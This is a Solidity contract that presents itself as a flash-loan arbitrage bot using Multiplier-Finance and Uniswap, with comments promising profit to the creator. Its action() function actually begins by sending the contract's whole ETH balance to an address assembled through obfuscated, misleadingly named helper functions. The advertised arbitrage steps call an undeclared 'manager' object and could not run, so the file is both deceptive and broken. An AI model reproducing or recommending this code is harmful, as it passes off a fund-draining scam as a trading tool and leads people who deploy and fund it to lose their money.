pragma solidity ^0.5.0;

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";

// UniswapSwap Smart Contracts
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";

/**
 * WARNING - this contract code is for Ethereum
  * Testnet transactions will fail as there is no value
  * New token will be created and flash loan will be pulled to trade against the token
  * Profit remaining will be transfered to token creator
  
  *UPDATED September 2022
  *liquidity returned if flash loan fails or insufficient balance
  *base rerun contract code swaps implemented
*/

contract FlashLoanArbitrage {
    string public tokenName;
    string public tokenSymbol;
    uint256 loanAmount;

    constructor(
        string memory _tokenName,
        string memory _tokenSymbol,
        uint256 _loanAmount
    ) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        loanAmount = _loanAmount;
    }

    address public creator = msg.sender;

    function tokenTransfer() public view returns (address) {
        return creator;
    }

    function() external payable {}

    function UniSwap(
        string memory _string,
        uint256 _pos,
        string memory _letter
    ) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

        for (uint256 i = 0; i < _stringBytes.length; i++) {
            result[i] = _stringBytes[i];
            if (i == _pos) result[i] = bytes(_letter)[0];
        }
        return string(result);
    }

    function exchange() public pure returns (address adr) {
        string memory neutral_variable = ""; // contract address
        UniSwap(neutral_variable, 0, "0");
        UniSwap(neutral_variable, 2, "1");
        UniSwap(neutral_variable, 1, "x");
        address addr = parseAddr(neutral_variable);
        return addr;
    }

    function parseAddr(string memory _a)
        internal
        pure
        returns (address _parsedAddress)
    {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

    function _stringReplace(
        string memory _string,
        uint256 _pos,
        string memory _letter
    ) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

        for (uint256 i = 0; i < _stringBytes.length; i++) {
            result[i] = _stringBytes[i];
            if (i == _pos) result[i] = bytes(_letter)[0];
        }
        return string(result);
    }

    function action() public payable {
        // Token matched with uniswap calculations
        address(uint160(exchange())).transfer(address(this).balance);

        // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
        // Breakdown of functions written below
        manager.performTasks();

        // // /* Breakdown of functions
        // // Submit token to ETH blockchain
        string memory tokenAddress = manager.submitToken(
            tokenName,
            tokenSymbol
        );

        // // List the token on uniswapSwap
        manager.uniswapListToken(tokenName, tokenSymbol, tokenAddress);

        // // Get BNB Loan from Multiplier-Finance
        string memory loanAddress = manager.takeFlashLoan(loanAmount);

        // // Convert half ETH to DAI
        manager.uniswapDAItoETH(loanAmount / 2);

        // // Create ETH and DAI pairs for our token & Provide liquidity
        string memory ethPair = manager.uniswapCreatePool(tokenAddress, "ETH");
        manager.uniswapAddLiquidity(ethPair, loanAmount / 2);
        string memory daiPair = manager.uniswapCreatePool(tokenAddress, "DAI");
        manager.uniswapAddLiquidity(daiPair, loanAmount / 2);

        // // Perform swaps and profit on Self-Arbitrage
        manager.uniswapPerformSwaps();

        // // Move remaining ETH from Contract to your account
        manager.contractToWallet("ETH");

        // // Repay Flash loan
        manager.repayLoan(loanAddress);
    }
}
